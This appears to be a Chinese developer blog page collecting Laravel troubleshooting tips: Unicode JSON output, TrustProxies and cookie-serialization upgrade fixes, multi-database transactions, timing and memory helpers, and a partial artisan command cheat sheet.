<h3 id="json-encode-中文"><a href="#json-encode-中文" class="headerlink" title="json_encode 中文"></a>json_encode 中文</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public/index.php</span><br><span class="line"></span><br><span class="line">$response = $kernel-&gt;handle(</span><br><span class="line">    $request = Illuminate\Http\Request::capture()</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 取到内容https://learnku.com/articles/28054#topnav</span></span><br><span class="line">$content = $response-&gt;original;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查原始内容的类型是否需要转 json</span></span><br><span class="line"><span class="keyword">if</span> ($content <span class="keyword">instanceof</span> Arrayable ||</span><br><span class="line">    $content <span class="keyword">instanceof</span> Jsonable ||</span><br><span class="line">    $content <span class="keyword">instanceof</span> ArrayObject ||</span><br><span class="line">    $content <span class="keyword">instanceof</span> JsonSerializable ||</span><br><span class="line">    is_array($content)) &#123;</span><br><span class="line">    <span class="comment">// 重新设置响应内容</span></span><br><span class="line">    $response-&gt;setContent(json_encode($content, JSON_UNESCAPED_UNICODE));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$response-&gt;send();</span><br></pre></td></tr></table></figure>
<h3 id="升级至Laravel-5-7报错setTrustedProxies-must-be-of-the-type-integer"><a href="#升级至Laravel-5-7报错setTrustedProxies-must-be-of-the-type-integer" class="headerlink" title="升级至Laravel 5.7报错setTrustedProxies() must be of the type integer"></a>升级至Laravel 5.7报错setTrustedProxies() must be of the type integer</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">打开 App\Http\Middleware\TrustProxies</span><br><span class="line"> </span><br><span class="line">将代码：http:<span class="comment">//www.ithov.net/php/1644.html</span></span><br><span class="line"> </span><br><span class="line">protected $headers = [</span><br><span class="line">        Request::<span class="function"><span class="params">HEADER_FORWARDED</span> =&gt;</span> <span class="string">'FORWARDED'</span>,</span><br><span class="line">        Request::<span class="function"><span class="params">HEADER_X_FORWARDED_FOR</span> =&gt;</span> <span class="string">'X_FORWARDED_FOR'</span>,</span><br><span class="line">        Request::<span class="function"><span class="params">HEADER_X_FORWARDED_HOST</span> =&gt;</span> <span class="string">'X_FORWARDED_HOST'</span>,</span><br><span class="line">        Request::<span class="function"><span class="params">HEADER_X_FORWARDED_PORT</span> =&gt;</span> <span class="string">'X_FORWARDED_PORT'</span>,</span><br><span class="line">        Request::<span class="function"><span class="params">HEADER_X_FORWARDED_PROTO</span> =&gt;</span> <span class="string">'X_FORWARDED_PROTO'</span>,</span><br><span class="line">    ];</span><br><span class="line"> </span><br><span class="line">修改为：</span><br><span class="line"> </span><br><span class="line">protected $headers = Request::HEADER_X_FORWARDED_ALL;</span><br></pre></td></tr></table></figure>
<h3 id="openssl-encrypt-expects-parameter-1-to-be-string"><a href="#openssl-encrypt-expects-parameter-1-to-be-string" class="headerlink" title="openssl_encrypt() expects parameter 1 to be string"></a>openssl_encrypt() expects parameter 1 to be string</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5.5</span> 升级到 <span class="number">5.5</span><span class="number">.42</span> 后遇到的 Cookie 序列化问题</span><br><span class="line">Laravel 新版为了防止 PHP 对象的序列化/反序列化漏洞被利用，不再对 Cookie 值进行自动的序列化和反序列化处理。</span><br><span class="line">\Cookie::queue(<span class="string">'user'</span>, [<span class="string">'id'</span> =&gt; <span class="number">1</span>, <span class="string">'name'</span> =&gt; <span class="string">'admin'</span>], <span class="number">720</span>, <span class="string">'/'</span>)</span><br><span class="line"></span><br><span class="line">Laravel 更新到 v5<span class="number">.5</span><span class="number">.42</span> 后，因为 Laravel 不再自动对 Cookie 值 [<span class="string">'id'</span> =&gt; <span class="number">1</span>, <span class="string">'name'</span> =&gt; <span class="string">'admin'</span>] 进行序列化处理，而 openssl_encrypt ( string $data ... ) 只能加密字符串数据，这个时候程序就会抛出错误：openssl_encrypt() expects parameter <span class="number">1</span> to be string, array given。</span><br><span class="line"></span><br><span class="line">解决方法：https:<span class="comment">//segmentfault.com/a/1190000018799611</span></span><br><span class="line"></span><br><span class="line">新版里面在中间件 AppHttpMiddlewareEncryptCookies 新增静态属性 $serialize，当设置为 <span class="literal">true</span> 时可开启 Cookie 值的自动序列化和反序列化处理。</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Indicates if cookies should be serialized.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @var bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">protected <span class="keyword">static</span> $serialize = <span class="literal">true</span>;</span><br><span class="line">【推荐】将 Cookie 值使用 <span class="built_in">JSON</span> 函数编码成字符串后再进行存储（获取 Cookie 值后需调用 <span class="built_in">JSON</span> 函数进行解码）。</span><br><span class="line">\Cookie::queue(<span class="string">'user'</span>, json_encode([<span class="string">'id'</span> =&gt; <span class="number">1</span>, <span class="string">'name'</span> =&gt; <span class="string">'admin'</span>]), <span class="number">720</span>, <span class="string">'/'</span>);</span><br></pre></td></tr></table></figure>
<h3 id="多库下的DB-transaction-事务失效"><a href="#多库下的DB-transaction-事务失效" class="headerlink" title="多库下的DB::transaction()事务失效"></a>多库下的DB::transaction()事务失效</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">DB::transaction(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">use</span> (<span class="params">$uid, $roleId</span>) </span>&#123;</span><br><span class="line">   RoomUserRole::insert([</span><br><span class="line">     <span class="string">'uid'</span> =&gt; $uid,</span><br><span class="line">     <span class="string">'role_id'</span> =&gt; $roleId,</span><br><span class="line">     <span class="string">'created_at'</span> =&gt; LARAVEL_START,</span><br><span class="line">     <span class="string">'updated_at'</span> =&gt; LARAVEL_START</span><br><span class="line">   ]);</span><br><span class="line"></span><br><span class="line">   RoomUserRoleLog::insert([</span><br><span class="line">     <span class="string">'uid'</span> =&gt; $uid,</span><br><span class="line">     <span class="string">'handle_type'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">     <span class="string">'admin_uid'</span> =&gt; Auth::user()-&gt;id,</span><br><span class="line">     <span class="string">'created_at'</span> =&gt; LARAVEL_START,</span><br><span class="line">     <span class="string">'updated_at'</span> =&gt; LARAVEL_START</span><br><span class="line">   ]);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">mysql 第二句会报错抛出一个异常， 查看数据库时第一句依然出入成功</span><br><span class="line">原文：https:<span class="comment">//blog.csdn.net/mathphp/article/details/82593779 </span></span><br><span class="line">DB::transaction()使用的是默认库的事务操作。所以要指定哪个数据库的事务</span><br><span class="line"></span><br><span class="line">DB::connection(<span class="string">'mysql2'</span>)-&gt;transaction(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">use</span> (<span class="params">$uid, $roleId</span>) </span>&#123;</span><br><span class="line">   RoomUserRole::insert([</span><br><span class="line">     <span class="string">'uid'</span> =&gt; $uid,</span><br><span class="line">     <span class="string">'role_id'</span> =&gt; $roleId,</span><br><span class="line">     <span class="string">'created_at'</span> =&gt; LARAVEL_START,</span><br><span class="line">     <span class="string">'updated_at'</span> =&gt; LARAVEL_START</span><br><span class="line">   ]);</span><br><span class="line"></span><br><span class="line">   RoomUserRoleLog::insert([</span><br><span class="line">     <span class="string">'uid'</span> =&gt; $uid,</span><br><span class="line">     <span class="string">'handle_type'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">     <span class="string">'admin_uid'</span> =&gt; Auth::user()-&gt;id,</span><br><span class="line">     <span class="string">'created_at'</span> =&gt; LARAVEL_START,</span><br><span class="line">     <span class="string">'updated_at'</span> =&gt; LARAVEL_START</span><br><span class="line">   ]);</span><br><span class="line"></span><br><span class="line">&#125;); <span class="comment">// 这样你会发现事务才正常回滚</span></span><br><span class="line">DB::connection(<span class="string">'mysql_chat_room'</span>)-&gt;beginTransaction();</span><br><span class="line">DB::connection(<span class="string">'mysql_chat_room'</span>)-&gt;commit();</span><br><span class="line">DB::connection(<span class="string">'mysql_chat_room'</span>)-&gt;rollBack(); <span class="comment">// 指定库，不然都会跑默认配置库的事务</span></span><br></pre></td></tr></table></figure>
<h3 id="执行时间和内存消耗"><a href="#执行时间和内存消耗" class="headerlink" title="执行时间和内存消耗"></a>执行时间和内存消耗</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getElapsedTime</span>(<span class="params">int $decimals  = <span class="number">2</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> number_format(microtime(<span class="literal">true</span>) - request()-&gt;server(<span class="string">'REQUEST_TIME_FLOAT'</span>), $decimals) . <span class="string">' s'</span>;</span><br><span class="line">&#125;</span><br><span class="line">内存使用：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMemoryUsage</span>(<span class="params">precision = <span class="number">2</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $size = memory_get_usage(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        $unit = [<span class="string">'b'</span>, <span class="string">'kb'</span>, <span class="string">'mb'</span>, <span class="string">'gb'</span>, <span class="string">'tb'</span>, <span class="string">'pb'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> round($size / pow(<span class="number">1024</span>, ($i = floor(log($size, <span class="number">1024</span>)))), $precision) . <span class="string">' '</span> . $unit[$i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="速查表"><a href="#速查表" class="headerlink" title="速查表"></a>速查表</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 针对命令显示帮助信息</span></span><br><span class="line">php artisan --help OR -h</span><br><span class="line"><span class="comment">// 抑制输出信息</span></span><br><span class="line">php artisan --quiet OR -q</span><br><span class="line"><span class="comment">// 打印 Laravel 的版本信息</span></span><br><span class="line">php artisan --version OR -V</span><br><span class="line"><span class="comment">// 不询问任何交互性的问题</span></span><br><span class="line">php artisan --no-interaction OR -n</span><br><span class="line"><span class="comment">// 强制输出 ANSI 格式</span></span><br><span class="line">php artisan --ansi</span><br><span class="line"><span class="comment">// 禁止输出 ANSI 格式</span></span><br><span class="line">php artisan --no-ansi</span><br><span class="line"><span class="comment">// 显示当前命令行运行的环境</span></span><br><span class="line">php artisan --env</span><br><span class="line"><span class="comment">// -v|vv|vvv 通过增加 v 的个数来控制命令行输出内容的详尽情况: 1 个代表正常输出, 2 个代表输出更多消息, 3 个代表调试</span></span><br><span class="line">php artisan --verbose</span><br><span class="line"><span class="comment">// 移除编译优化过的文件 (storage/frameworks/compiled.php)</span></span><br><span class="line">php artisan clear-compiled</span><br><span class="line"><span class="comment">// 显示当前框架运行的环境</span></span><br><span class="line">php artisan env</span><br><span class="line"><span class="comment">// 显示某个命令的帮助信息</span></span><br><span class="line">php artisan help</span><br><span class="line"><span class="comment">// 显示所有可用的命令</span></span><br><span class="line">php artisan list</span><br><span class="line"><span class="comment">// 进入应用交互模式</span></span><br><span class="line">php artisan tinker</span><br><span class="line"><span class="comment">// 配合 dump() 函数调试数据</span></span><br><span class="line">php artisan dump-server</span><br><span class="line"><span class="comment">// 进入维护模式</span></span><br><span class="line">php artisan down</span><br><span class="line"><span class="comment">// 退出维护模式</span></span><br><span class="line">php artisan up</span><br><span class="line"><span class="comment">// 优化框架性能</span></span><br><span class="line"><span class="comment">// --force    强制编译已写入文件 (storage/frameworks/compiled.php)</span></span><br><span class="line"><span class="comment">// --psr      不对 Composer 的 dump-autoload 进行优化</span></span><br><span class="line">php artisan optimize [--force] [--psr]</span><br><span class="line"><span class="comment">// 更改前端预设</span></span><br><span class="line"><span class="comment">// type_name (可以是 none, bootstrap, vue, react)</span></span><br><span class="line">php artisan preset [options] [--] type_name</span><br><span class="line"><span class="comment">// 启动内置服务器</span></span><br><span class="line">php artisan serve</span><br><span class="line"><span class="comment">// 更改默认端口</span></span><br><span class="line">php artisan serve --port <span class="number">8080</span></span><br><span class="line"><span class="comment">// 使其在本地服务器外也可正常工作</span></span><br><span class="line">php artisan serve --host <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"><span class="comment">// 更改应用命名空间</span></span><br><span class="line">php artisan app:name namespace</span><br><span class="line"><span class="comment">// 清除过期的密码重置令牌</span></span><br><span class="line">php artisan auth:clear-resets</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清空应用缓存</span></span><br><span class="line">php artisan cache:clear</span><br><span class="line"><span class="comment">// 移除 key_name 对应的缓存</span></span><br><span class="line">php artisan cache:forget key_name [&lt;store&gt;]</span><br><span class="line">// 创建缓存数据库表 migration</span><br><span class="line">php artisan cache:table</span><br><span class="line"></span><br><span class="line">// 合并所有的配置信息为一个，提高加载速度</span><br><span class="line">php artisan config:cache</span><br><span class="line">// 移除配置缓存文件</span><br><span class="line">php artisan config:clear</span><br><span class="line"></span><br><span class="line">// 程序内部调用 Artisan 命令</span><br><span class="line">$exitCode = Artisan::call('config:cache');</span><br><span class="line">// 运行所有的 seed 假数据生成类</span><br><span class="line">// --class      可以指定运行的类，默认是: "DatabaseSeeder"</span><br><span class="line">// --database   可以指定数据库</span><br><span class="line">// --force      当处于生产环境时强制执行操作</span><br><span class="line">php artisan db:seed [--class[="..."]] [--database[="..."]] [--force]</span><br><span class="line"></span><br><span class="line">// 基于注册的信息，生成遗漏的 events 和 handlers</span><br><span class="line">php artisan event:generate</span><br><span class="line">// 罗列所有事件和监听器</span><br><span class="line">php artisan event:list</span><br><span class="line">// 缓存事件和监听器</span><br><span class="line">php artisan event:cache</span><br><span class="line">// 清除事件和监听器缓存</span><br><span class="line">php artisan event:clear</span><br><span class="line"></span><br><span class="line">// 生成新的处理器类</span><br><span class="line">// --command      需要处理器处理的命令类名字</span><br><span class="line">php artisan handler:command [--command="..."] name</span><br><span class="line">// 创建一个新的时间处理器类</span><br><span class="line">// --event        需要处理器处理的事件类名字</span><br><span class="line">// --queued       需要处理器使用队列话处理的事件类名字</span><br><span class="line">php artisan handler:event [--event="..."] [--queued] name</span><br><span class="line"></span><br><span class="line">// 生成应用的 key（会覆盖）</span><br><span class="line">php artisan key:generate</span><br><span class="line"></span><br><span class="line">// 发布本地化翻译文件到 resources 文件下</span><br><span class="line">// locales: 逗号分隔，如 zh_CN,tk,th [默认是: "all"]</span><br><span class="line">php artisan lang:publish [options] [--] [&lt;locales&gt;]</span><br><span class="line"></span><br><span class="line">// 创建用户认证脚手架</span><br><span class="line">php artisan make:auth</span><br><span class="line">// 创建 Channel 类</span><br><span class="line">php artisan make:channel name</span><br><span class="line">// 在默认情况下, 这将创建未加入队列的自处理命令</span><br><span class="line">// 通过 --handler 标识来生成一个处理器, 用 --queued 来使其入队列.</span><br><span class="line">php artisan make:command [--handler] [--queued] name</span><br><span class="line">// 创建一个新的 Artisan 命令</span><br><span class="line">//  --command     命令被调用的名称。 (默认为: "command:name")</span><br><span class="line">php artisan make:console [--command[="..."]] name</span><br><span class="line">// 创建一个新的资源控制器</span><br><span class="line">// --plain      生成一个空白的控制器类</span><br><span class="line">php artisan make:controller [--plain] name</span><br><span class="line">php artisan make:controller App\\Admin\\Http\\Controllers\\DashboardController</span><br><span class="line">// 创建一个新的事件类</span><br><span class="line">php artisan make:event name</span><br><span class="line">// 创建异常类</span><br><span class="line">php artisan make:exception name</span><br><span class="line">// 创建模型工厂类</span><br><span class="line">php artisan make:factory name</span><br><span class="line">// 创建一个队列任务文件</span><br><span class="line">php artisan make:job </span><br><span class="line">// 创建一个监听者类</span><br><span class="line">php artisan make:listener name</span><br><span class="line">// 创建一个新的邮件类</span><br><span class="line">php artisan make:mail name</span><br><span class="line">// 创建一个新的中间件类</span><br><span class="line">php artisan make:middleware name</span><br><span class="line">// 创建一个新的迁移文件</span><br><span class="line">// --create     将被创建的数据表.</span><br><span class="line">// --table      将被迁移的数据表.</span><br><span class="line">php artisan make:migration [--create[="..."]] [--table[="..."]] name</span><br><span class="line">// 创建一个新的 Eloquent 模型类</span><br><span class="line">php artisan make:model User</span><br><span class="line">php artisan make:model Models/User</span><br><span class="line">// 新建一个消息通知类</span><br><span class="line">php artisan make:notification TopicRepliedNotification</span><br><span class="line">// 新建一个模型观察者类</span><br><span class="line">php artisan make:observer UserObserver</span><br><span class="line">// 创建授权策略</span><br><span class="line">php artisan make:policy PostPolicy</span><br><span class="line">// 创建一个新的服务提供者类</span><br><span class="line">php artisan make:provider name</span><br><span class="line">// 创建一个新的表单请求类</span><br><span class="line">php artisan make:request name</span><br><span class="line">// 创建一个 API 资源类</span><br><span class="line">php artisan make:resource name</span><br><span class="line">// 新建验证规则类</span><br><span class="line">php artisan make:rule name</span><br><span class="line">// 创建模型脚手架</span><br><span class="line">// &lt;name&gt; 模型名称，如 Post</span><br><span class="line">// -s, --schema=SCHEMA 表结构如：--schema="title:string"</span><br><span class="line">// -a, --validator[=VALIDATOR] 表单验证，如：--validator="title:required"</span><br><span class="line">// -l, --localization[=LOCALIZATION] 设置本地化信息，如：--localization="key:value"</span><br><span class="line">// -b, --lang[=LANG] 设置本地化语言 --lang="en"</span><br><span class="line">// -f, --form[=FORM] 使用 Illumintate/Html Form 来生成表单选项，默认为 false</span><br><span class="line">// -p, --prefix[=PREFIX] 表结构前缀，默认 false</span><br><span class="line">php artisan make:scaffold  [options] [--] &lt;name&gt;</span><br><span class="line">// 生成数据填充类</span><br><span class="line">php artisan make:seeder</span><br><span class="line">// 生成测试类</span><br><span class="line">php artisan make:test</span><br><span class="line"></span><br><span class="line">// 数据库迁移</span><br><span class="line">// --database   指定数据库连接（下同）</span><br><span class="line">// --force      当处于生产环境时强制执行，不询问（下同）</span><br><span class="line">// --path       指定单独迁移文件地址</span><br><span class="line">// --pretend    把将要运行的 SQL 语句打印出来（下同）</span><br><span class="line">// --seed       Seed 任务是否需要被重新运行（下同）</span><br><span class="line">php artisan migrate [--database[="..."]] [--force] [--path[="..."]] [--pretend] [--seed]</span><br><span class="line">// 创建迁移数据库表</span><br><span class="line">php artisan migrate:install [--database[="..."]]</span><br><span class="line">// Drop 所有数据表并重新运行 Migration</span><br><span class="line">php artisan migrate:fresh</span><br><span class="line">// 重置并重新运行所有的 migrations</span><br><span class="line">// --seeder     指定主 Seeder 的类名</span><br><span class="line">php artisan migrate:refresh [--database[="..."]] [--force] [--seed] [--seeder[="..."]]</span><br><span class="line">// 回滚所有的数据库迁移</span><br><span class="line">php artisan migrate:reset [--database[="..."]] [--force] [--pretend]</span><br><span class="line">// 回滚最最近一次运行的迁移任务</span><br><span class="line">php artisan migrate:rollback [--database[="..."]] [--force] [--pretend]</span><br><span class="line">// migrations 数据库表信息</span><br><span class="line">php artisan migrate:status</span><br><span class="line"></span><br><span class="line">// 为数据库消息通知创建一个表迁移类</span><br><span class="line">php artisan notifications:table</span><br><span class="line">// 清除缓存的 bootstrap 文件</span><br><span class="line">php artisan optimize:clear</span><br><span class="line">// 扩展包自动发现</span><br><span class="line">php artisan package:discover</span><br><span class="line"></span><br><span class="line">// 为队列数据库表创建一个新的迁移</span><br><span class="line">php artisan queue:table</span><br><span class="line">// 监听指定的队列</span><br><span class="line">// --queue      被监听的队列</span><br><span class="line">// --delay      给执行失败的任务设置延时时间 (默认为零: 0)</span><br><span class="line">// --memory     内存限制大小，单位为 MB (默认为: 128)</span><br><span class="line">// --timeout    指定任务运行超时秒数 (默认为: 60)</span><br><span class="line">// --sleep      等待检查队列任务的秒数 (默认为: 3)</span><br><span class="line">// --tries      任务记录失败重试次数 (默认为: 0)</span><br><span class="line">php artisan queue:listen [--queue[="..."]] [--delay[="..."]] [--memory[="..."]] [--timeout[="..."]] [--sleep[="..."]] [--tries[="..."]] [connection]</span><br><span class="line">// 查看所有执行失败的队列任务</span><br><span class="line">php artisan queue:failed</span><br><span class="line">// 为执行失败的数据表任务创建一个迁移</span><br><span class="line">php artisan queue:failed-table</span><br><span class="line">// 清除所有执行失败的队列任务</span><br><span class="line">php artisan queue:flush</span><br><span class="line">// 删除一个执行失败的队列任务</span><br><span class="line">php artisan queue:forget</span><br><span class="line">// 在当前的队列任务执行完毕后, 重启队列的守护进程</span><br><span class="line">php artisan queue:restart</span><br><span class="line">// 对指定 id 的执行失败的队列任务进行重试(id: 失败队列任务的 ID)</span><br><span class="line">php artisan queue:retry id</span><br><span class="line">// 指定订阅 Iron.io 队列的链接</span><br><span class="line">// queue: Iron.io 的队列名称.</span><br><span class="line">// url: 将被订阅的 URL.</span><br><span class="line">// --type       指定队列的推送类型.</span><br><span class="line">php artisan queue:subscribe [--type[="..."]] queue url</span><br><span class="line">// 处理下一个队列任务</span><br><span class="line">// --queue      被监听的队列</span><br><span class="line">// --daemon     在后台模式运行</span><br><span class="line">// --delay      给执行失败的任务设置延时时间 (默认为零: 0)</span><br><span class="line">// --force      强制在「维护模式下」运行</span><br><span class="line">// --memory     内存限制大小，单位为 MB (默认为: 128)</span><br><span class="line">// --sleep      当没有任务处于有效状态时, 设置其进入休眠的秒数 (默认为: 3)</span><br><span class="line">// --tries      任务记录失败重试次数 (默认为: 0)</span><br><span class="line">php artisan queue:work [--queue[="..."]] [--daemon] [--delay[="..."]] [--force] [--memory[="..."]] [--sleep[="..."]] [--tries[="..."]] [connection]</span><br><span class="line"></span><br><span class="line">// 生成路由缓存文件来提升路由效率</span><br><span class="line">php artisan route:cache</span><br><span class="line">// 移除路由缓存文件</span><br><span class="line">php artisan route:clear</span><br><span class="line">// 显示已注册过的路由</span><br><span class="line">php artisan route:list</span><br><span class="line"></span><br><span class="line">// 运行计划命令</span><br><span class="line">php artisan schedule:run</span><br><span class="line"></span><br><span class="line">// 为 session 数据表生成迁移文件</span><br><span 